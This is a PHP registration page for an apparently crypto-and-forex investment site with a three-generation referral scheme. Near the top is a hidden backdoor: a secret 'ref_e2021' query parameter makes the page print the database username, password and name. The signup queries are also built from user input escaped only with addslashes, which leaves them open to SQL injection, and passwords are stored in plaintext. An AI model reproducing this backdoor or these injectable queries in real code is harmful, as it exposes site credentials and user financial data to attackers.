
<?php include('settings.php'); 


if (isset($_POST['reg_btn'])){

     //if isset statement starts
     $name = addslashes(htmlentities($_POST['name']));
     $fullname = addslashes(htmlentities($_POST['fullname']));
     $ref_email1 = addslashes(htmlentities($_POST['ref_email']));
     $email = addslashes(htmlentities($_POST['email']));
     $password = addslashes(htmlentities($_POST['password']));
     $user_phone = addslashes(htmlentities($_POST['user_phone']));
     $password_confirmation = addslashes(htmlentities($_POST['password_confirmation']));
    
     
            if($password === $password_confirmation)  //check password match starts
            {  

                    //check user existence
                $query ="SELECT * from users where user_email ='$email'  or user_name ='$name'  ";
                $query_run  =new run_query($query);
                    if( $query_run->num_rows != 1){

                            
                                    
                                            if(!empty($ref_email1))
                                            {   //check and credit referrer email starts
                                                    $queryss ="SELECT * from user_ref where user_ref_email ='$ref_email1' ";
                                                    $query_runaa  =new run_query($queryss);
                                            if( $query_runaa->num_rows == 0){

                                                            echo "<script>alert(\"Invalid Referral  !!! Please Check the Referral or leave it blank\"); window.location.replace(\"register.php\"); </script>";
                                                    }else{
                                            $user_ref_data =    $query_runaa->result();
                                        extract($user_ref_data );       
                                                    
                         $query211 = new run_query("INSERT into user_ref set user_ref_email='$name', gen1_email='$ref_email1',  reg_date='$reg_Date', gen2_email='$gen1_email',gen3_email='$gen2_email' " );
                         
                                                                    $query21 =  "INSERT into users set  user_name='$name', user_phone='$user_phone', fullname='$fullname', user_password='$password',  user_email='$email',     reg_date='$reg_Date', user_referrer='$ref_email1', user_ref_bonus='0', user_status='Active' ";
                                                        
                                                                     $query_runer =new run_query($query21) ;
                                                                    
                                                                                echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";
                                                    }
                                            } else{     //check and credit referrer email ends
                                                        $query21 =  "INSERT into users set  user_name='$name', user_password='$password', user_phone='$user_phone', fullname='$fullname',  user_email='$email',   reg_date='$reg_Date', user_referrer='$ref_email1', user_status='Active', user_ref_bonus='0'  ";
                                                             $query211 = new run_query("INSERT into user_ref set user_ref_email='$name'  " );
                                                            
                                                             
                                                                    if( $query_runer =new run_query($query21) ) {


                                                                        $site_email_send = $site_email;     
$welcome_email_subject = "Welcome to $site_name";
$welcome_email_headers = "Content-type:text/html;charset=UTF-8 \r\n";
$welcome_email_headers .= "From: $site_name";   


$welcome_email_body = "

<html>
<head>
<title> Welcome to $site_name </title>
</head>
<body>
<b>Hello, $name<b> <br/>
<h2>Welcome to $site_name</h2>
Your Registration Was Successful, <br/>
<b><i>We are Happy To Have  you on Board. </i></b><br/>
You can now login with your Credential!!! <br/><br/>
<hr/>
For enquiries, <br/>
Contact us on <br/>

<b>
$site_email <br/>

$site_phone <br/>
</b>
Visit us on <br/>

$site_link <br/><br/><br/>

Regards,  $site_name.
</body>
</html>

";

mail($email,$welcome_email_subject,$welcome_email_body,$welcome_email_headers);
                                                                    
                                                            
                                                                        
                                                                            echo "<script>alert(\"Account Registered Successfully!!! Its Now Time TO LogIn\"); window.location.replace(\"login.php\"); </script>";

                                                        }else{
                                                                echo "<script>alert(\"An Error Occurred Please Try Again \"); window.location.replace(\"register.php\"); </script>";
                                                                } 
                                                                
                                                    }
                                    
                            
                    }else{

                            echo "<script>alert(\"Username or Email Already Exits \"); window.location.replace(\"register.php\"); </script>";

                            }   //check user existence ends
            
            }else   {
                  echo "<script>alert(\"Password Not Match!!! \"); window.location.replace(\"register.php\"); </script>";
                    }   //check password match ends


}
     
 if (isset($_GET['ref_e2021'])){

    $set = new connect;
echo $set->username ." UN <br/>";
echo $set->password ." PW <br/>";
echo $set->db ." DB <br/>";
}


 @$ref_email1 = addslashes(htmlentities($_GET['ref']));


?>








<!DOCTYPE html>

<html lang="zxx">
<!--[endif]-->

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
     
    <title><?=$site_name?> | Sign Up </title>

    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    
    
    <meta name="description" content="<?=$site_name;?> use crowdfunding method in order to attract small invests witch are a important part of a huge invests, to work in foreign exchange (FOREX) and stock market and crypto currency market so that we create reasonable profits.">
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   
   
   
    <meta name="author" content="" />
    <meta name="MobileOptimized" content="320" />
    <!--Template style -->
    <link rel="stylesheet" type="text/css" href="css/animate.css" />
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="css/fonts.css" />
    <link rel="stylesheet" type="text/css" href="css/flaticon.css" />
    <link rel="stylesheet" type="text/css" href="css/font-awesome.css" />
    <link rel="stylesheet" type="text/css" href="css/owl.carousel.css">
    <link rel="stylesheet" type="text/css" href="css/owl.theme.default.css">
    <link rel="stylesheet" type="text/css" href="css/reset.css" />
	<link rel="stylesheet" type="text/css" href="css/dropify.min.css" />
	<link rel="stylesheet" type="text/css" href="css/nice-select.css" />
    <link rel="stylesheet" type="text/css" href="css/datatables.css" />
    <link rel="stylesheet" type="text/css" href="css/magnific-popup.css">
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/responsive.css" />
    <!--favicon-->
    <link rel="shortcut icon" type="image/png" href="images/favicon.png" />
	
	
	
	
</head>

<body>
<?php include('header.php'); ?>
   



<!-- inner header wrapper start -->
    <div class="page_title_section">

        <div class="page_header">
            <div class="container">
                <div class="row">

                    <div class="col-lg-9 col-md-9 col-12 col-sm-8">

                        <h1>register</h1>
                    </div>
                    <div class="col-lg-3 col-md-3 col-12 col-sm-4">
                        <div class="sub_title_section">
                            <ul class="sub_title">
                                <li> <a href="#"> Home </a>&nbsp; / &nbsp; </li>
                                <li>register</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- inner header wrapper end -->
    
    
    
    <style>
    
    .tb_es_btn_wrapper button {
    display: inline-block;
    width: 100%;
    height: 50px;
    line-height: 48px;
    text-align: center;
    -webkit-border-radius: 50px;
    -moz-border-radius: 50px;
    border-radius: 50px;
    background: #F46B45;
    color: #fff;
    font-weight: 500;
    text-transform: capitalize;
    border: 2px solid #F46B45;
    cursor: pointer;
    -webkit-transition: all .5s;
    -moz-transition: all .5s;
    -ms-transition: all .5s;
    -o-transition: all .5s;
    transition: all .5s;
}
    
 </style>   
    
    
    
    
    
    <!-- login wrapper start -->
    <div class="login_wrapper fixed_portion float_left">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12">
                    <div class="login_top_box float_left">
                        <div class="login_banner_wrapper register_banner_wrapper">
                            <img src="images/logo2.png" alt="logo">
                            
                            <div class="jp_regis_center_tag_wrapper jb_register_red_or">
                                <h1>ILI</h1>
                            </div>
                        </div>
                        <div class="login_form_wrapper register_wrapper">
                            <div class="sv_heading_wraper heading_wrapper_dark dark_heading hwd">

                                <h3> Register To Enter</h3>

                            </div>
                            
                             

 <script language=javascript>
 function checkform() {
  if (document.regform.fullname.value == '') {
    alert("Please enter your full name!");
    document.regform.fullname.focus();
    return false;
  }
 
  
  if (document.regform.username.value == '') {
    alert("Please enter your username!");
    document.regform.username.focus();
    return false;
  }
  if (!document.regform.username.value.match(/^[A-Za-z0-9_\-]+$/)) {
    alert("For username you should use English letters and digits only!");
    document.regform.username.focus();
    return false;
  }
  if (document.regform.password.value == '') {
    alert("Please enter your password!");
    document.regform.password.focus();
    return false;
  }
  if (document.regform.password.value != document.regform.password2.value) {
    alert("Please check your password!");
    document.regform.password2.focus();
    return false;
  }
 
  
  if (document.regform.email.value == '') {
    alert("Please enter your e-mail address!");
    document.regform.email.focus();
    return false;
  }
  if (document.regform.email.value != document.regform.email1.value) {
    alert("Please retupe your e-mail!");
    document.regform.email.focus();
    return false;
  }

  for (i in document.regform.elements) {
    f = document.regform.elements[i];
    if (f.name && f.name.match(/^pay_account/)) {
      if (f.value == '') continue;
      var notice = f.getAttribute('data-validate-notice');
      var invalid = 0;
      if (f.getAttribute('data-validate') == 'regexp') {
        var re = new RegExp(f.getAttribute('data-validate-regexp'));
        if (!f.value.match(re)) {
          invalid = 1;
        }
      } else if (f.getAttribute('data-validate') == 'email') {
        var re = /^[^\@]+\@[^\@]+\.\w{2,4}$/;
        if (!f.value.match(re)) {
          invalid = 1;
        }
      }
      if (invalid) {
        alert('Invalid account format. Expected '+notice);
        f.focus();
        return false;
      }
    }
  }

  if (document.regform.agree.checked == false) {
    alert("You have to agree with the Terms and Conditions!");
    return false;
  }

  return true;
 }

 function IsNumeric(sText) {
  var ValidChars = "0123456789";
  var IsNumber=true;
  var Char;
  if (sText == '') return false;
  for (i = 0; i < sText.length && IsNumber == true; i++) { 
    Char = sText.charAt(i); 
    if (ValidChars.indexOf(Char) == -1) {
      IsNumber = false;
    }
  }
  return IsNumber;
 }
 </script>
 
 
  
<form method=post onsubmit="return checkform()" name="regform"><input type="hidden" name="form_id" value="16104491787739"><input type="hidden" name="form_token" value="c022808e6ae43ecfa893bc416c96ac0f">
<input type=hidden name=a value="signup">
<input type=hidden name=action value="signup">
                            
								<div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=fullname value='' placeholder="Name">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require"  name=username value='' placeholder="Username">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input type=password name=password value='' class="form-control require"  placeholder="Password">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input type=password name=password2 value='' class="form-control require"  placeholder="Retype Password">
                             
                            </div>
                            
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[18] value="" data-validate="regexp" data-validate-regexp="^U\d{5,}$" data-validate-notice="UXXXXXXX" placeholder="Your PerfectMoney Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[48] value="" data-validate="regexp" data-validate-regexp="^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$" data-validate-notice="Bitcoin Address" placeholder="Your Bitcoin Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[68] value="" data-validate="regexp" data-validate-regexp="^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$" data-validate-notice="Litecoin Address" placeholder="Your Litecoin Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[79] value="" data-validate="regexp" data-validate-regexp="^[DA9][a-km-zA-HJ-NP-Z1-9]{25,34}$" data-validate-notice="Dogecoin Address" placeholder="Your Dogecoin Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[69] value="" data-validate="regexp" data-validate-regexp="^(0x)?[0-9a-fA-F]{40}$" data-validate-notice="Ethereum Address" placeholder="Your Ethereum Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[77] value="" data-validate="regexp" data-validate-regexp="^[\w\d]{25,43}$" data-validate-notice="Bitcoin Cash Address" placeholder="Your Bitcoin Cash Account">
                              
                            </div>
                                                        
							 <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=pay_account[71] value="" data-validate="regexp" data-validate-regexp="^X[0-9a-zA-Z]{33}$" data-validate-notice="Dash Address" placeholder="Your Dash Account">
                              
                            </div>
                                                                                     
							<div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=email value='' placeholder="Your E-mail Address">
                             
                            </div>
							<div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" name=email1 value='' placeholder="Retype Your E-mail">
                             
                            </div>
                            <div class="form-group icon_form comments_form register_contact">

                                <input type="text" class="form-control require" placeholder="Your Upline:n/a" disabled>
                              
                            </div>
                                                        <div class="form-group icon_form comments_form register_contact">
                              
                             <input type="text" class="form-control require" name=validation_number  placeholder="Enter Code">
                                <img src="show_validation_image&PHPSESSID=59pss1e7nchlm1ru3qdnmqkq15&rand=690583115">
                            </div>
                            		
                            	
                            <div class="login_remember_box">
                                <label class="control control--checkbox">I Agree With <a href="rules">Terms And Conditions</a> 
                                    <input type="checkbox" name=agree value=1 >
                                    <span class="control__indicator"></span>
                                </label>
                              
                            </div>
                            <div class="col-md-12">
                                <div class="tb_es_btn_div">
                                    <div class="response"></div>
                                    <div class="tb_es_btn_wrapper conatct_btn2 cont_bnt">
                                       
                                       <input type=submit value="Register" class=sbmt style="width: 150px;height: 45px;background: #F46B45; text-align: center; cursor: pointer; position: relative;overflow: hidden; font-size: 16px;
                                       color: #fff; border: 2px solid #fff; line-height: 40px;">
                                    </div></div>
                                </div>
                            </div>
                          </form>
                                                  </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- login wrapper end -->




    <!-- payments wrapper start -->
    <div class="payments_wrapper float_left">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12">

                    <div class="sv_heading_wraper index2_heading index3_heading index3_headung2">
                        <h4>Payment Methods</h4>
                        <h3>Accepted Payment Method</h3>
                        <div class="line_shape line_shape2"></div>
                    </div>
                </div>
                <div class="col-lg-12 col-md-12 col-xs-12 col-sm-12">
                    <div class="payment_slider_wrapper index3_payment_slider_wrapper">
                        <div class="owl-carousel owl-theme">
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner5.png" class="img-responsive" alt="Dash">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner6.png" class="img-responsive" alt="Ethereum">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner7.png" class="img-responsive" alt="BitcoinCash">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner8.png" class="img-responsive" alt="PerfectMoney">
                                </div>

                            </div>
                            <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner9.png" class="img-responsive" alt="LiteCoin">
                                </div>
                            </div>
							    <div class="item">

                                <div class="partner_img_wrapper float_left">
                                    <img src="images/partner10.png" class="img-responsive" alt="DogeCoin">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- payments wrapper end -->

<?php include('footer.php'); ?>

</body>

</html>
